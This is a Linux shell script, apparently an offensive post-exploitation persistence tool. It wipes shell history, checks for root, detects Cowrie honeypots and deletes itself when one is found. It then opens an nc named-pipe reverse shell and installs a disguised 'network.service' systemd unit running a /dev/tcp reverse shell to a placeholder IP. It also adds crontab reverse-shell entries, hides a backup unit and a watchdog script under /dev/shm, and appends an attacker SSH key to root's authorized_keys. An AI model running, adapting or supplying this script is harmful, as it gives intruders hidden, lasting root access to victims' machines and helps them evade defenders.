#!/bin/sh
#created by ice-wzl
#usage: ./shm.sh 2>/dev/null --> will launch clean on target device
#2021-10-23
#tested on Ubuntu 20.04/CentOS 8

##########################################################################

#begin checks if conditions are not met, delete 
#remote history logging for script
unset HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND
#ensure running as root if not, delete
perms=$(id | grep uid | cut -d ' ' -f1 | cut -d '=' -f2 | cut -d '(' -f1)
if [ $perms -ne 0 ]; then
	rm shm.sh
	exit 1
else
	continue
fi
#ensure that this is a linux system
if [ "$(cat /proc/version | grep Linux)" ]; then
	continue
else
	rm shm.sh
	exit 2
fi
#ensure that it is a systemd system
if [ "$(ps -elf | grep -E '/sbin/init | /lib/systemd/system | /usr/lib/systemd/systemd' | grep -v grep)" ]; then
	continue
else
	rm shm.sh
	exit 3
fi

#start cowrie honeypot checks
#srv04 is the default hostname for cowrie
view=$(which cat)

if [ "$($view /etc/hostname | grep srv04)" ]; then
	echo "Yes"
	rm shm.sh
	exit 4
else
	continue
fi

#phil is the default home directory on cowrie and cowrie will run on Debian 4.* by default
#want to combine these to in order to make sure we are not deleting off every machine with phil as a user
look=$(which ls)

if [ "$($look /home | grep 'phil' && $view /proc/version | grep "Debian 4.")" ]; then
	rm shm.sh
	exit 5
else
	continue
fi

#file is not included on cowrie so check for that

if [ "$(which file)" ]; then
	continue
else
	rm shm.sh
	exit 6
fi


#internet test
interweb=$(ping -c 4 8.8.8.8 | grep "64 bytes" | cut -d " " -f1,2)
if [ "$interweb" ]; then
	echo "Yes internet" #would want to put a call out here 
else
	echo "No internet" #need to think of something to go here as well 
fi

#test for "fake internet access"
fake=$(ping -c 4 999.999.999.999 | grep "64 bytes" | cut -d " " -f1,2)
if [ "$fake" ];then
	rm shm.sh
	exit 7
else
	continue
fi

#good to proceed checks over
#check if nc is on the target and -b is passed in as $1 if yes beacon if no skip
if [[ "$(which nc)" && $1 = "-b" ]]; then
	continue
	touch /tmp/.f
	rm /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/bash -i 2>&1|nc 127.0.0.1 80 >/tmp/.f & 
	
else
	continue
fi

#persistance via service
#get shell var
shell=$(which bash)
touch /etc/systemd/system/network.service
chmod +x /etc/systemd/system/network.service
echo '[Unit]' > /etc/systemd/system/network.service
echo 'Description=Network Service' >> /etc/systemd/system/network.service
echo 'Documentation=man:nc(1)' >> /etc/systemd/system/network.service
echo 'After=network.target' >> /etc/systemd/system/network.service

echo '[Service]' >> /etc/systemd/system/network.service
echo 'Type=Simple' >> /etc/systemd/system/network.service
echo 'User=root' >> /etc/systemd/system/network.service
echo "ExecStart=$shell -c 'bash -i >& /dev/tcp/IP_ADDRESS/1111 0>&1'" >> /etc/systemd/system/network.service
echo 'Restart=Always' >> /etc/systemd/system/network.service

echo '[Install]' >> /etc/systemd/system/network.service
echo 'WantedBy=multi-user.target' >> /etc/systemd/system/network.service
#enable on boot and reload daemon + start the new service beacon
systemctl daemon-reload
sleep 1
systemctl enable network.service
systemctl start network.service
sleep 1


#crontab persistance to ensure checker script is running in the background + beacon persistance
echo "*/10 * * * * root /bin/sh /dev/shm/.proc/proc &" >> /etc/crontab
echo "*/30 * * * * root /bin/sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP_ADDRESS 443 >/tmp/f" >> /etc/crontab

#make backup service file
mkdir /dev/shm/.fstab
touch /dev/shm/.fstab/fstab
chmod +x /dev/shm/.fstab/fstab

#backup service unit file
echo '[Unit]' > /dev/shm/.fstab/fstab
echo 'Description=Network Service' >> /dev/shm/.fstab/fstab
echo 'Documentation=man:nc(1)' >> /dev/shm/.fstab/fstab
echo 'After=network.target' >> /dev/shm/.fstab/fstab

echo '[Service]' >> /dev/shm/.fstab/fstab
echo 'User=root' >> /dev/shm/.fstab/fstab
echo 'Type=Simple' >> /dev/shm/.fstab/fstab
echo "ExecStart=$shell -c 'bash -i >& /dev/tcp/IP_ADDRESS/1111 0>&1'" >> /dev/shm/.fstab/fstab
echo 'Restart=Always' >> /dev/shm/.fstab/fstab

echo '[Install]' >> /dev/shm/.fstab/fstab
echo 'WantedBy=multi-user.target' >> /dev/shm/.fstab/fstab


#create checker script to cp backup service unit file to systemd/system if it is deleted will run + crontab 10 minutes
mkdir /dev/shm/.proc
touch /dev/shm/.proc/proc
chmod +x /dev/shm/.proc/proc
echo '#!/bin/bash' >> /dev/shm/.proc/proc
echo 'if [[ -e /etc/systemd/system/network.service ]]; then' >> /dev/shm/.proc/proc
echo '    exit 0' >> /dev/shm/.proc/proc
echo 'else' >> /dev/shm/.proc/proc
echo '    cp /dev/shm/.fstab/fstab /etc/systemd/system/network.service' >> /dev/shm/.proc/proc 
echo '    chmod +x /etc/systemd/system/network.service' >> /dev/shm/.proc/proc
echo '    systemctl daemon-reload' >> /dev/shm/.proc/proc
echo '    systemctl enable network.service' >> /dev/shm/.proc/proc
echo '    systemctl start network.service' >> /dev/shm/.proc/proc
echo 'fi' >> /dev/shm/.proc/proc
sleep 1
cd /dev/shm/.proc
./proc &

#ssh key persistance will be able to pull ip from beacons + key will give alternative way onto the box outside of catching shells
if [[ -d /root/.ssh ]]; then
	continue
else
	mkdir /root/.ssh
fi
if [[ -f /root/.ssh/authorized_keys ]]; then
	echo 'PUBLIC_SSH_KEY_HERE' >> /root/.ssh/authorized_keys
else
	touch /root/.ssh/authorized_keys
	echo 'PUBLIC_SSH_KEY_HERE' > /root/.ssh/authorized_keys
fi

rm shm.sh
exit 0
